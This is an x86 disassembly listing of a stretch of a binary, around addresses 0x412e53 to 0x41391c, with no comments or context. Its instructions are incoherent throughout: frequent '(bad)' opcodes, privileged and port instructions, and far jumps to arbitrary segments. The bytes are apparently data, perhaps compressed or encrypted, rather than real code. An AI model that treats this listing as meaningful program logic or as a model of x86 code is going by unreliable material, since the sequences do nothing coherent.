  412e53:	add    BYTE PTR [esi],bh
  412e55:	xor    al,0x2
  412e57:	mov    edi,ebx
  412e59:	pop    edx
  412e5a:	pop    ebx
  412e5b:	sahf   
  412e5c:	imul   edx,eax,0x96c2afa4
  412e62:	pop    ebx
  412e63:	xor    edi,DWORD PTR [ebx-0x4cccb06a]
  412e69:	xchg   esi,eax
  412e6a:	inc    ebx
  412e6b:	xor    esp,DWORD PTR [edi+edx*2+0x332e183e]
  412e72:	popa   
  412e73:	xchg   ebp,eax
  412e74:	or     BYTE PTR [ecx+0x6b],al
  412e77:	and    BYTE PTR [esi],al
  412e79:	pop    ebx
  412e7a:	pushf  
  412e7b:	add    DWORD PTR ds:[edi+0x7b],edx
  412e7f:	lea    edi,[esi+0x5b]
  412e82:	push   ss
  412e83:	sahf   
  412e84:	call   0x9e4955c9
  412e89:	shr    DWORD PTR [eax-0xbf26fd],1
  412e8f:	popf   
  412e90:	clc    
  412e91:	push   esi
  412e92:	dec    ebx
  412e93:	lea    edi,[esi+0x5b]
  412e96:	out    dx,al
  412e97:	popf   
  412e98:	rol    BYTE PTR [eax-0x19],0x17
  412e9c:	mov    dl,0x33
  412e9e:	jmp    0x9647:0xaf40b09f
  412ea5:	pop    edx
  412ea6:	out    0x3,eax
  412ea8:	fadd   QWORD PTR ds:[eax+eax*4]
  412eac:	retf   
  412ead:	call   0xdf6a:0x720d9ce7
  412eb4:	test   eax,0x428d1
	...
  412ee1:	add    BYTE PTR [ecx+0x3a80c7c7],al
  412ee7:	imul   DWORD PTR [ebp+0x43]
  412eea:	ds inc eax
  412eec:	sbb    al,0xf5
  412eee:	loope  0x412ea9
  412ef0:	push   ecx
  412ef1:	inc    esp
  412ef2:	ds into 
  412ef4:	sub    al,0xac
  412ef6:	or     DWORD PTR [eax-0xb],eax
  412ef9:	scas   eax,DWORD PTR es:[edi]
  412efa:	push   eax
  412efb:	mov    BYTE PTR [eax],0xe5
  412efe:	stos   BYTE PTR es:[edi],al
  412eff:	(bad)  
  412f00:	or     BYTE PTR [ecx+0x66fe4332],al
  412f06:	add    eax,0x68e9111a
  412f0b:	aam    0xec
  412f0d:	push   0xfffffff6
  412f0f:	xor    edi,esi
  412f11:	aam    0x35
  412f13:	xor    edi,DWORD PTR [edi]
  412f15:	pushf  
  412f16:	mov    edx,0xc0d96b40
  412f1b:	xchg   esi,eax
  412f1c:	lock cdq 
  412f1e:	stos   BYTE PTR es:[edi],al
  412f1f:	(bad)  
  412f20:	or     BYTE PTR [ecx+0x6a],al
  412f23:	lods   eax,DWORD PTR ds:[esi]
  412f24:	std    
  412f25:	es inc edi
  412f27:	sbb    esi,DWORD PTR [ebp+eiz*8+0x4]
  412f2b:	sbb    cl,BYTE PTR [ecx]
  412f2d:	jmp    0x8a99a49
  412f32:	push   ss
  412f33:	call   0x1151:0x4b817400
  412f3a:	sub    BYTE PTR [ebp+edi*8+0x741b36f6],ah
  412f41:	in     eax,0xf4
  412f43:	sbb    DWORD PTR [ecx],ecx
  412f45:	jmp    0x412f4a
	...
  412f6e:	add    BYTE PTR [eax],al
  412f70:	adc    BYTE PTR [esi+0x5b3de8ec],0x0
  412f77:	add    BYTE PTR fs:[edi],ch
  412f7a:	push   ecx
  412f7b:	into   
  412f7c:	dec    eax
  412f7d:	push   ebx
  412f7e:	call   0xfe818038
  412f83:	bnd jge 0x412f51
  412f86:	push   es
  412f87:	push   0x28
  412f89:	das    
  412f8a:	add    DWORD PTR [eax+edi*1],esi
  412f8d:	je     0x412f4f
  412f8f:	mov    al,0x7f
  412f91:	push   edi
  412f92:	add    BYTE PTR [ecx],bh
  412f94:	addr16 adc ch,dl
  412f97:	in     al,dx
  412f98:	lods   al,BYTE PTR ds:[esi]
  412f99:	aaa    
  412f9a:	jb     0x412f84
  412f9c:	cld    
  412f9d:	push   ebx
  412f9e:	rol    BYTE PTR [eax],0x5a
  412fa1:	out    0x55,al
  412fa3:	cmp    DWORD PTR [edi+0xf05735c],0x5c
  412faa:	add    BYTE PTR [ecx],al
  412fac:	push   edi
  412fad:	(bad)  
  412faf:	add    DWORD PTR [ebx],ebx
  412fb1:	pop    ecx
  412fb2:	sub    eax,eax
  412fb4:	outs   dx,BYTE PTR ds:[esi]
  412fb5:	sbb    al,0x6
  412fb7:	add    BYTE PTR [esi+eax*8-0x31e8be75],dh
  412fbe:	inc    esp
  412fbf:	in     al,dx
  412fc0:	mov    bh,0xdf
  412fc2:	je     0x412fcc
  412fc4:	outs   dx,DWORD PTR ds:[esi]
  412fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fc6:	push   esp
  412fc7:	call   DWORD PTR [eax-0x25]
  412fca:	cmc    
  412fcb:	add    ebx,ecx
  412fcd:	push   ebp
  412fce:	cmp    eax,0x830665e5
	...
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	shr    dh,cl
  413000:	std    
  413001:	je     0x412fdc
  413003:	xor    edi,DWORD PTR [esi+0x5215c9]
  413009:	lea    ebp,[edx+0x4aff4dee]
  41300f:	push   edx
  413010:	call   0xff20daa7
  413015:	or     edi,0x5c
  413018:	je     0x41301f
  41301a:	and    al,0xdf
  41301c:	push   DWORD PTR [ecx+ebx*4-0x2b]
  413020:	jl     0x41300e
  413022:	xchg   edi,eax
  413023:	imul   eax,DWORD PTR [esi],0x2b
  413026:	xlat   BYTE PTR ds:[ebx]
  413027:	adc    al,al
  413029:	or     BYTE PTR [edi+0x37ec44d3],ah
  41302f:	loop   0x4130a5
  413031:	or     BYTE PTR [edi+0x67],bh
  413034:	push   ebx
  413035:	call   eax
  413037:	dec    esi
  413038:	shl    BYTE PTR [ebp+0x69],0xd5
  41303c:	jl     0x41302a
  41303e:	imul   eax,DWORD PTR ds:0x3e2b,0xfffffff4
  413044:	retf   
  413045:	shl    DWORD PTR [esi],0x34
  413048:	mov    DWORD PTR [edx+ebp*2+0x64],eax
  41304c:	cdq    
  41304d:	je     0x413095
  41304f:	in     al,dx
  413050:	xor    BYTE PTR [ebp+0x49],dl
  413053:	lds    eax,FWORD PTR [ebp+0x46fef7]
  413059:	cmp    DWORD PTR [ebx+0x387504a8],0x69
  413060:	(bad)  
  413061:	enter  0x0,0x0
	...
  413089:	add    BYTE PTR [eax],al
  41308b:	add    ah,bh
  41308d:	cmp    eax,DWORD PTR [edx]
  41308f:	lea    edi,[ebx-0x80]
  413092:	xor    al,0xff
  413094:	xchg   ebx,eax
  413095:	dec    esp
  413096:	stos   BYTE PTR es:[edi],al
  413097:	imul   edi,DWORD PTR ss:[ebp-0x67],0xffffff82
  41309c:	push   es
  41309d:	push   esp
  41309e:	clts   
  4130a0:	mov    ebp,0x72ffa5ee
  4130a5:	cs out dx,eax
  4130a7:	mov    edi,0xc7207
  4130ac:	mov    ebx,0xe14fa5ee
  4130b1:	out    0x9,al
  4130b3:	call   0xfedc0fec
  4130b8:	mov    ebp,0x4074e45b
  4130bd:	mov    cl,0x17
  4130bf:	in     al,dx
  4130c0:	ds (bad) 
  4130c2:	jmp    FWORD PTR [edx]
  4130c4:	jle    0x4130d0
  4130c6:	les    eax,FWORD PTR [edi]
  4130c8:	ds scas eax,DWORD PTR es:[edi]
  4130ca:	inc    eax
  4130cb:	in     al,dx
  4130cc:	push   cs
  4130cd:	call   0x25aa:0x3c2bfee4
  4130d4:	repz adc al,0x9b
  4130d7:	mov    ebx,?
  4130d9:	rdmsr  
  4130db:	call   DWORD PTR [ebx]
  4130dd:	cmp    al,0xaa
  4130df:	xchg   ebp,eax
  4130e0:	jmp    0xe85a:0x76829aec
  4130e7:	adc    eax,0x69fda45
  4130ec:	icebp  
  4130ed:	push   esp
  4130ee:	push   0x18
	...
  413118:	add    BYTE PTR [eax],al
  41311a:	push   edx
  41311b:	pop    edx
  41311c:	adc    al,0x2
  41311e:	and    eax,0x39c5b11b
  413123:	pop    ebx
  413124:	dec    edx
  413125:	jnp    0x4130e2
  413127:	fwait
  413128:	out    0x88,eax
  41312a:	cli    
  41312b:	sbb    BYTE PTR cs:[esi],ch
  41312e:	data16 cmp al,0xdd
  413131:	or     esp,DWORD PTR [esi]
  413133:	dec    ebx
  413134:	mov    ah,0x9a
  413136:	sub    BYTE PTR [ebp+ebx*1+0x5c5b6158],dh
  41313d:	inc    eax
  41313e:	sub    ch,BYTE PTR [ecx+edx*8-0x1438eefc]
  413145:	call   0x3d08:0x273f5392
  41314c:	das    
  41314d:	int3   
  41314e:	call   DWORD PTR [ebx-0x19]
  413151:	xor    ch,al
  413153:	das    
  413154:	imul   edi,DWORD PTR [edi-0x6853311b],0x71
  41315b:	xor    edx,DWORD PTR [eax]
  41315d:	xor    ebx,ecx
  41315f:	cmp    al,0x7
  413161:	adc    dl,dl
  413163:	cmp    al,0x75
  413165:	pop    es
  413166:	(bad)  
  413167:	das    
  413168:	call   0x490f:0x2750c09a
  41316f:	cmp    al,0x5d
  413171:	or     al,0xb1
  413173:	(bad)  
  413174:	fld    TBYTE PTR [esp+eiz*2+0x3499d73d]
  41317b:	sbb    edx,DWORD PTR [ebp+0x4]
	...
  4131a6:	add    BYTE PTR [eax],al
  4131a8:	cdq    
  4131a9:	mov    bl,0xac
  4131ac:	mov    gs,WORD PTR [ebx+0x197699be]
  4131b2:	add    ebp,esp
  4131b4:	cmp    eax,0xd7bd89a6
  4131b9:	(bad)  
  4131ba:	or     al,0x91
  4131bc:	adc    ebx,DWORD PTR [edi+0x1b3b9efd]
  4131c2:	jne    0x41318e
  4131c4:	mov    bh,0x10
  4131c7:	cmp    DWORD PTR [edx-0x4879a46d],ebp
  4131cd:	mov    WORD PTR [eax-0x80],gs
  4131d0:	in     al,0x7b
  4131d2:	add    BYTE PTR [esi+0x31],dh
  4131d5:	arpl   bp,di
  4131d7:	hlt    
  4131d8:	sub    DWORD PTR [ebp+edi*8-0x76ccba24],ecx
  4131df:	imul   eax,edi,0x6515e93c
  4131e5:	cmp    al,0xfe
  4131e7:	and    BYTE PTR [eax],al
  4131e9:	push   0x2fc29c00
  4131ee:	imul   ebp,ecx,0xc1bf2c3d
  4131f4:	clc    
  4131f5:	mov    bh,0x3f
  4131f7:	jmp    0x934df8d2
  4131fc:	repz cmp al,0x74
  4131ff:	icebp  
  413200:	xchg   ebp,eax
  413201:	jmp    0x413200
  413203:	push   ss
  413204:	(bad)  
  413205:	mov    bl,0x0
  413207:	jmp    0x1faa2fb2
	...
  413234:	add    BYTE PTR [eax],al
  413236:	push   ds
  413237:	call   0xd36a:0x4f38fe00
  41323e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41323f:	(bad)  
  413240:	or     BYTE PTR [ecx],al
  413242:	xor    eax,0x65e6fe3d
  413247:	pop    ebx
  413248:	add    dh,cl
  41324a:	pop    es
  41324b:	mov    ah,0xcb
  41324d:	dec    ebp
  41324e:	std    
  41324f:	pop    edx
  413250:	std    
  413251:	push   esp
  413252:	inc    esi
  413253:	mov    cl,0x1c
  413255:	add    BYTE PTR [eax+0x4c],bh
  413258:	or     al,ch
  41325a:	adc    eax,0xfffffee3
  41325f:	push   esi
  413260:	add    bh,ch
  413262:	jmp    0x26a608d6
  413267:	push   edi
  413268:	std    
  413269:	jne    0x4132c6
  41326b:	ins    DWORD PTR es:[edi],dx
  41326c:	sbb    al,0xff
  41326e:	inc    edx
  41326f:	dec    edi
  413270:	call   0xff23fae0
  413275:	push   0xbeed5767
  41327a:	das    
  41327b:	adc    al,0x62
  41327d:	inc    ecx
  41327e:	push   edi
  41327f:	loop   0x4132f5
  413281:	or     al,0x3d
  413283:	inc    eax
  413284:	push   DWORD PTR [ebp+0x2f]
  413287:	pop    es
  413288:	push   edx
  413289:	dec    DWORD PTR [eax+0x170065d3]
  41328f:	add    al,0xbc
  413291:	push   0x3f5a51
  413296:	js     0x413301
  413298:	or     al,0x6a
	...
  4132c2:	add    BYTE PTR [eax],al
  4132c4:	xor    al,0xd4
  4132c6:	je     0x4132d0
  4132c8:	jg     0x4132db
  4132ca:	(bad)  
  4132cb:	jmp    FWORD PTR [eax]
  4132cd:	and    eax,0x89e708c0
  4132d2:	mov    esp,ebp
  4132d4:	push   esp
  4132d5:	cli    
  4132d6:	stc    
  4132d7:	push   0xffffffd7
  4132d9:	mov    BYTE PTR [edx],dh
  4132db:	push   DWORD PTR [edx-0x4d32179a]
  4132e1:	sar    esi,cl
  4132e3:	mov    DWORD PTR [edx-0x4d919a2e],esp
  4132e9:	popf   
  4132ea:	add    bh,bh
  4132ec:	xor    ah,BYTE PTR [esi-0x18]
  4132ef:	dec    ebp
  4132f0:	cwde   
  4132f1:	sar    dh,cl
  4132f3:	call   DWORD PTR [edx]
  4132f5:	sar    esi,cl
  4132f7:	jne    0x413337
  4132f9:	cmp    al,0xaa
  4132fb:	div    ebx
  4132fd:	sub    BYTE PTR [esi+0x2487cc8],dl
  413303:	push   ebp
  413304:	mov    ch,0x28
  413306:	add    bl,0x82
  413309:	sahf   
  41330a:	add    al,0x6a
  41330c:	sub    eax,0x66081009
  413311:	loopne 0x413342
  413313:	jmp    FWORD PTR [ecx-0x55]
  413316:	aas    
  413317:	cld    
  413318:	(bad)  
  413319:	dec    esi
  41331a:	pop    ds
  41331b:	inc    ecx
  41331c:	ds jmp 0x40a73b31
  413322:	xchg   edi,eax
  413323:	dec    BYTE PTR [ecx-0x47]
  413326:	paddb  mm0,QWORD PTR [eax]
	...
  413351:	add    BYTE PTR [ecx+0x37],al
  413354:	or     ch,al
  413356:	add    DWORD PTR [edi-0x6b],ecx
  413359:	inc    BYTE PTR [edi]
  41335b:	xchg   BYTE PTR [eax],al
  41335d:	add    BYTE PTR [ebx-0x57d5753],dl
  413363:	mov    ebp,DWORD PTR [edx]
  413365:	add    BYTE PTR [eax+edx*2-0x73b98b6b],ah
  41336c:	sub    DWORD PTR [ebp+0x9],edx
  41336f:	jns    0x4132fc
  413371:	inc    esp
  413372:	add    bl,BYTE PTR [edi+edi*2]
  413375:	fs jg  0x4133bc
  413378:	xchg   edi,eax
  413379:	je     0x4133c1
  41337b:	dec    esp
  41337c:	test   eax,0x2a58e9fd
  413381:	add    BYTE PTR [esi-0x57],dl
  413384:	pop    ds
  413385:	inc    ecx
  413386:	fdiv   QWORD PTR ds:[edx+0x64]
  41338a:	jg     0x4133d0
  41338c:	xchg   edi,eax
  41338d:	xor    al,0xf3
  41338f:	jmp    0x4133d5
  413391:	add    dh,dl
  413393:	daa    
  413394:	cmp    edi,edi
  413396:	mov    ecx,0x7173c23c
  41339b:	pop    ebx
  41339c:	jo     0x4133de
  41339e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41339f:	ret    0x55e0
  4133a2:	popa   
  4133a3:	pop    ebx
  4133a4:	aas    
  4133a5:	add    al,0x3e
  4133a7:	dec    edx
  4133a8:	mov    gs,WORD PTR [ebx]
  4133aa:	cmp    DWORD PTR [esi-0x5076fbd8],0xffffffbf
  4133b1:	xchg   esi,eax
  4133b2:	or     ah,BYTE PTR [ebx-0x41]
  4133b5:	rol    DWORD PTR [eax],1
	...
  4133df:	add    al,bh
  4133e1:	cmp    DWORD PTR [edi+0x27f8772b],ebp
  4133e7:	add    al,0xd6
  4133e9:	pop    edx
  4133ea:	out    0xa6,eax
  4133ec:	mov    ds:0xff1fbdc2,eax
  4133f1:	pop    edx
  4133f2:	mov    ss,WORD PTR [eax]
  4133f4:	push   esi
  4133f5:	cmp    ebp,edi
  4133f7:	or     edx,DWORD PTR [esi+0x52]
  4133fa:	(bad)  
  4133fb:	xchg   esi,eax
  4133fc:	inc    eax
  4133fd:	cmp    ebp,edi
  4133ff:	fwait
  413400:	and    DWORD PTR [ebx],esp
  413402:	pop    ss
  413403:	xchg   edi,eax
  413404:	xor    BYTE PTR [ecx],bh
  413406:	fst    QWORD PTR [edi-0x541050d8]
  41340c:	mov    ss,WORD PTR gs:[esi-0x6a]
  413410:	push   es
  413411:	push   ds
  413412:	in     al,0x3
  413414:	imul   esp,esp,0x53
  413417:	cmp    ch,0x37
  41341a:	rol    BYTE PTR [ebx],cl
  41341c:	xchg   esp,eax
  41341d:	outs   dx,BYTE PTR ds:[esi]
  41341e:	adc    BYTE PTR ss:[esi+0x43],al
  413422:	dec    eax
  413423:	das    
  413424:	icebp  
  413425:	cmp    BYTE PTR [ecx+0x40],dh
  413428:	jmp    0x165b:0x7f205ac3
  41342f:	adc    BYTE PTR [esi+0x43],al
  413432:	mov    BYTE PTR [ebp+0x100738d0],dl
  413438:	retf   0x7538
  41343b:	or     edx,esi
  41343d:	add    BYTE PTR fs:[eax+edx*8+0x2bc839],bl
	...
  41346d:	add    BYTE PTR [ecx-0x298daac8],dh
  413473:	ffree  st(4)
  413475:	fst    QWORD PTR [ebx+ebx*2+0x6a]
  413479:	pop    ds
  41347a:	mov    bl,0xaf
  41347c:	or     cl,al
  41347e:	sbb    ecx,DWORD PTR [ebp+edi*8-0x3604a3a]
  413485:	push   ecx
  413486:	out    0xbe,al
  413488:	aas    
  413489:	jmp    0xc149e460
  41348e:	pop    ebx
  41348f:	ss (bad) 
  413491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413492:	shr    DWORD PTR [edi+0x63319efc],cl
  413498:	call   0xfe794350
  41349d:	mov    al,ds:0x1c005c7c
  4134a2:	mov    bh,0x44
  4134a4:	and    BYTE PTR [ebp+0x300c2a6],0xb
  4134ab:	cmp    DWORD PTR [ecx+eiz*8-0x1b],esi
  4134af:	mov    ch,0x54
  4134b1:	shl    dx,cl
  4134b4:	inc    ebx
  4134b5:	pop    ebp
  4134b6:	push   edx
  4134b7:	and    DWORD PTR [eax+ebp*4+0x3d],esp
  4134bb:	cmp    BYTE PTR [ecx+eiz*8-0x1b],dh
  4134bf:	xor    eax,0x38b346fc
  4134c4:	je     0x413503
  4134c6:	stos   DWORD PTR es:[edi],eax
  4134c7:	scas   al,BYTE PTR es:[edi]
  4134c8:	or     BYTE PTR [ecx+0x65],al
  4134cb:	mov    ebp,?
  4134cd:	cs add eax,0xe9051a
	...
  4134fb:	add    BYTE PTR [eax],bl
  4134fd:	in     al,0xec
  4134ff:	push   0xfffffffe
  413501:	xor    ebp,DWORD PTR [ebx-0x17]
  413504:	daa    
  413505:	jae    0x413504
  413507:	xchg   esp,eax
  413508:	inc    ebp
  413509:	inc    ebx
  41350a:	dec    esp
  41350b:	add    BYTE PTR [ebx-0x65760132],ch
  413511:	iret   
  413512:	gs into 
  413514:	retf   0x9c
  413517:	jmp    FWORD PTR [edx]
  413519:	fs call 0xff0fd7ec
  41351f:	dec    DWORD PTR [edx]
  413521:	sar    esi,cl
  413523:	jne    0x4134c4
  413525:	add    esi,DWORD PTR [esi+0x54]
  413528:	or     dh,0xc8
  41352b:	ret    0x5b9b
  41352e:	push   ebx
  41352f:	mov    esi,DWORD PTR [ebx-0x32]
  413532:	je     0x413540
  413534:	jg     0x4134d0
  413536:	pop    ecx
  413537:	jmp    DWORD PTR [eax+0x4274c062]
  41353d:	xchg   edi,ebx
  41353f:	gs push ss
  413541:	pop    edi
  413542:	push   eax
  413543:	call   0x3ea6e8
  413548:	pop    ss
  413549:	into   
  41354a:	je     0x41355c
  41354c:	daa    
  41354d:	into   
  41354e:	je     0x413558
  413550:	scas   eax,DWORD PTR es:[edi]
  413551:	inc    ecx
  413552:	xlat   BYTE PTR ds:[ebx]
  413553:	push   DWORD PTR [eax-0x5fa937fe]
  413559:	iret   
  41355a:	enter  0x33c2,0x5b
  41355e:	push   ebx
  41355f:	mov    eax,DWORD PTR [eax]
	...
  413589:	add    BYTE PTR [ebx-0x25],dh
  41358c:	sar    eax,0xd8
  41358f:	test   BYTE PTR [eax],al
  413591:	push   0x2e
  413593:	shl    BYTE PTR [eax+ecx*1+0x6f],1
  413597:	add    edx,DWORD PTR [ebx-0x1]
  41359a:	inc    eax
  41359b:	loope  0x4135e1
  41359d:	cld    
  41359e:	pop    esp
  41359f:	or     eax,0x5aa64859
  4135a4:	cmp    BYTE PTR [edi],0xd7
  4135a7:	data16 jl 0x413612
  4135aa:	jg     0x413601
  4135ac:	aas    
  4135ad:	add    BYTE PTR [esi],bh
  4135af:	cmc    
  4135b0:	test   eax,0x2447d0d
  4135b5:	or     edi,esi
  4135b7:	mov    eax,0xe2d65734
  4135bc:	and    edi,edi
  4135be:	mov    ecx,0xb73c239
  4135c3:	mov    ebx,0x97a9f83e
  4135c8:	mov    WORD PTR [ecx+0x44],gs
  4135cb:	adc    eax,0xc6a60818
  4135d0:	xchg   ecx,eax
  4135d1:	(bad)  
  4135d2:	xchg   ecx,eax
  4135d3:	and    eax,0x4014f818
  4135d8:	xchg   ebx,eax
  4135d9:	je     0x413611
  4135db:	or     al,0xc
  4135dd:	(bad)  
  4135de:	jns    0x4135cd
  4135e0:	xchg   ecx,eax
  4135e1:	je     0x413659
  4135e3:	call   0x6b9a:0x2bf3fee5
  4135ea:	popa   
  4135eb:	aad    0x91
  4135ed:	add    BYTE PTR [bx+si],al
	...
  413618:	gs addr16 inc ebx
  41361b:	add    BYTE PTR [ecx+0x4f],dl
  41361e:	mov    edi,fs
  413620:	push   edx
  413621:	jnp    0x4135b4
  413623:	(bad)  
  413624:	xor    eax,0x8e121904
  413629:	lods   eax,DWORD PTR ds:[esi]
  41362a:	pop    ss
  41362b:	clc    
  41362c:	mov    es,ebp
  41362e:	pop    ss
  41362f:	or     BYTE PTR [esi],dl
  413631:	fnstsw WORD PTR [edx-0x2e73de02]
  413637:	push   ebp
  413638:	sbb    DWORD PTR [ebp-0x63e98b6f],ecx
  41363e:	fst    DWORD PTR [ebp+0x9]
  413641:	popf   
  413642:	nop
  413643:	xor    bh,dh
  413645:	ficom  DWORD PTR [ecx-0x69930602]
  41364b:	lods   eax,DWORD PTR ds:[esi]
  41364c:	ss cmp eax,0x5ae98419
  413652:	pushf  
  413653:	(bad)  
  413654:	loopne 0x413605
  413656:	out    dx,eax
  413657:	fwait
  413658:	mov    ch,0x89
  41365a:	push   ss
  41365b:	xchg   ebx,eax
  41365c:	jo     0x413682
  41365e:	sub    cl,BYTE PTR [eax]
  413660:	ds nop
  413662:	jb     0x413604
  413664:	shr    BYTE PTR [edi-0x6edc6415],0xf6
  41366b:	xchg   edx,eax
  41366c:	inc    esp
  41366d:	sbb    esi,DWORD PTR [eax+esi*8+0x21]
  413671:	xor    DWORD PTR [ebp+0x45],ecx
  413674:	ds mov ecx,edi
  413677:	xchg   ebp,eax
  413678:	div    BYTE PTR ds:0x33d7
	...
  4136a6:	xchg   ecx,eax
  4136a7:	scas   eax,DWORD PTR es:[edi]
  4136a8:	div    DWORD PTR [ebx]
  4136aa:	mov    DWORD PTR [edi+0xcf29bef],ebp
  4136b0:	mov    edi,0x1d476192
  4136b5:	xchg   ebx,eax
  4136b6:	jo     0x4136db
  4136b8:	stos   BYTE PTR es:[edi],al
  4136b9:	jmp    FWORD PTR [ecx-0x72]
  4136bc:	jb     0x41365d
  4136be:	mov    esp,0xe43aa01e
  4136c3:	pop    edx
  4136c4:	add    esi,ecx
  4136c6:	push   eax
  4136c7:	scas   eax,DWORD PTR es:[edi]
  4136c8:	fistp  WORD PTR [ebx-0x6d7975c5]
  4136ce:	mov    dh,0x9f
  4136d0:	jnp    0x413750
  4136d2:	jp     0x413666
  4136d4:	pop    ds
  4136d5:	inc    ebp
  4136d6:	fld    TBYTE PTR ds:[esi-0x306d4dfd]
  4136dd:	cwde   
  4136de:	call   0xa96b:0x263ae79a
  4136e5:	add    edi,DWORD PTR [esi]
  4136e7:	pusha  
  4136e8:	daa    
  4136e9:	pop    ss
  4136ea:	dec    edx
  4136eb:	mov    WORD PTR [edi-0x78],cs
  4136ee:	pusha  
  4136ef:	xor    al,0x3f
  4136f1:	(bad)  
  4136f2:	mov    ecx,0x72fb00af
  4136f7:	lahf   
  4136f8:	clc    
  4136f9:	cs inc esi
  4136fb:	xor    ebp,DWORD PTR [ebx+0x3]
  4136fe:	int    0xaf
  413700:	or     BYTE PTR [ecx],dl
  413702:	(bad)  
  413703:	xor    eax,0xafac16fe
  413708:	clc    
  413709:	add    DWORD PTR [eax],0x0
	...
  413734:	fnstenv ds:0xb3a5f174
  41373a:	std    
  41373b:	dec    bh
  41373d:	xor    eax,0x7852f174
  413742:	std    
  413743:	je     0x4136ea
  413745:	cmp    al,0x6d
  413747:	out    0xcf,al
  413749:	xor    eax,0x3cca54fe
  41374e:	jl     0x41378c
  413750:	scas   eax,DWORD PTR es:[edi]
  413751:	xor    eax,0xf3821afd
  413756:	std    
  413757:	(bad)  
  413758:	scas   eax,DWORD PTR es:[edi]
  413759:	xor    eax,0x5d8a8ff3
  41375e:	jae    0x4136ee
  413760:	iret   
  413761:	scas   eax,DWORD PTR es:[edi]
  413762:	cld    
  413763:	scas   al,BYTE PTR es:[edi]
  413764:	push   ecx
  413765:	arpl   ax,bp
  413767:	mov    ebp,DWORD PTR [eax]
  413769:	xor    al,0xfe
  41376b:	ds xchg ebp,eax
  41376d:	sbb    al,BYTE PTR ds:0xece008e9
  413773:	push   0x76
  413775:	xor    BYTE PTR [esi+0x13],dl
  413778:	cmp    al,cl
  41377a:	cmp    DWORD PTR [esi+0x51],edi
  41377d:	arpl   ax,bp
  41377f:	ins    DWORD PTR es:[edi],dx
  413780:	push   0x8160fe34
  413785:	aaa    
  413786:	mov    ah,BYTE PTR [edx*2-0x4216c05d]
  41378d:	je     0x41378f
  41378f:	fnstsw WORD PTR [ebp-0x3d]
  413792:	add    eax,edi
  413794:	jl     0x4137f1
  413796:	push   ebp
	...
  4137bf:	add    BYTE PTR [eax],al
  4137c1:	add    BYTE PTR [edi-0x3e],ch
  4137c4:	inc    eax
  4137c5:	add    bh,ah
  4137c7:	ss mov esi,0xe8724474
  4137cd:	sti    
  4137ce:	mov    ecx,0x170bfeca
  4137d3:	push   ebx
  4137d4:	pop    ss
  4137d5:	push   eax
  4137d6:	scas   eax,DWORD PTR es:[edi]
  4137d7:	push   edi
  4137d8:	add    bh,ch
  4137da:	imul   edx,DWORD PTR [edi+0xd],0x50579666
  4137e1:	inc    DWORD PTR [edx+0x30]
  4137e4:	out    0x3,al
  4137e6:	cmp    ebx,ecx
  4137e8:	(bad)  
  4137e9:	call   0x3ea489
  4137ee:	fwait
  4137ef:	push   cs
  4137f0:	mov    esi,0xfeca98b9
  4137f5:	push   DWORD PTR [ebp-0x47]
  4137f8:	xor    eax,0xff1ef207
  4137fd:	jne    0x41387a
  4137ff:	retf   0x874
  413802:	outs   dx,DWORD PTR ds:[esi]
  413803:	dec    eax
  413804:	push   edx
  413805:	(bad)  
  413806:	mov    eax,0x63c2c76a
  41380b:	push   edi
  41380c:	push   ebx
  41380d:	mov    ebp,DWORD PTR [ebx-0x2b173e22]
  413813:	and    al,0x67
  413815:	dec    ebx
  413816:	es pop edi
  413818:	add    BYTE PTR [ebp+0x63],dh
  41381b:	lock mov edi,0x55570c
  413821:	push   0x57
  413823:	push   ebp
  413824:	std    
  413825:	inc    DWORD PTR [eax]
	...
  41384f:	add    BYTE PTR [edx],dh
  413851:	xor    ebp,DWORD PTR [eax+0x0]
  413854:	cmp    eax,0x5795e857
  413859:	push   edi
  41385a:	add    BYTE PTR [ecx+0x75fee6d2],cl
  413860:	lahf   
  413861:	(bad)  
  413862:	aam    0x54
  413864:	mov    DWORD PTR ds:[eax-0x6f5f7c78],edx
  41386b:	je     0x413873
  41386d:	call   0x7490:0x7164fc16
  413874:	inc    edx
  413875:	push   ds
  413876:	add    ch,BYTE PTR [edx+0x3e]
  413879:	pushf  
  41387a:	adc    al,0x40
  41387c:	ds inc esp
  41387e:	jg     0x4138c4
  413880:	shl    ah,cl
  413882:	sbb    eax,DWORD PTR [eax]
  413884:	fs inc esp
  413886:	sbb    al,0x12
  413888:	push   esp
  413889:	inc    esp
  41388a:	xchg   ecx,eax
  41388b:	je     0x41384f
  41388d:	pop    ecx
  41388e:	mul    BYTE PTR [esi+0x5]
  413891:	add    eax,DWORD PTR [edx]
  413893:	test   DWORD PTR [esi+0x39],edi
  413896:	jp     0x41381f
  413898:	ds inc esp
  41389a:	add    cl,BYTE PTR [ebx+0x117a100b]
  4138a0:	retf   
  4138a1:	ja     0x413837
  4138a3:	dec    edi
  4138a4:	and    al,0x44
  4138a6:	sbb    BYTE PTR [edx],dl
  4138a8:	adc    al,0x44
  4138aa:	sbb    dh,BYTE PTR [eax+ebx*1]
  4138ad:	add    DWORD PTR [edi+edi*8],0xfffffff3
  4138b1:	out    0x8d,eax
  4138b3:	push   ecx
	...
  4138dc:	add    BYTE PTR [eax],al
  4138de:	dec    esi
  4138df:	mov    edi,0x10977c4
  4138e4:	sbb    al,dh
  4138e6:	push   esi
  4138e7:	test   BYTE PTR [eax-0x1],al
  4138ea:	pop    ecx
  4138eb:	stos   DWORD PTR es:[edi],eax
  4138ec:	inc    edi
  4138ed:	call   0x485a3d37
  4138f2:	dec    ecx
  4138f3:	inc    edi
  4138f4:	pushf  
  4138f5:	out    0xd2,eax
  4138f7:	dec    edi
  4138f8:	(bad)  
  4138f9:	inc    bh
  4138fb:	jbe    0x41389d
  4138fd:	(bad)  
  4138fe:	stos   DWORD PTR es:[edi],eax
  4138ff:	mov    ah,0x9c
  413901:	push   edx
  413902:	js     0x4138c5
  413904:	(bad)  
  413905:	(bad)  
  413906:	stos   DWORD PTR es:[edi],eax
  413907:	pop    ebx
  413908:	dec    edi
  413909:	(bad)  
  41390a:	xchg   edx,eax
  41390b:	aas    
  41390c:	pop    edi
  41390d:	sbb    DWORD PTR [esi],ecx
  41390f:	inc    ebx
  413910:	sub    eax,0xe3320940
  413915:	ret    
  413916:	lea    edx,[esi-0x31]
  413919:	add    edi,DWORD PTR [esi]
  41391b:	inc    edx
  41391c:	jle    0x4138ad
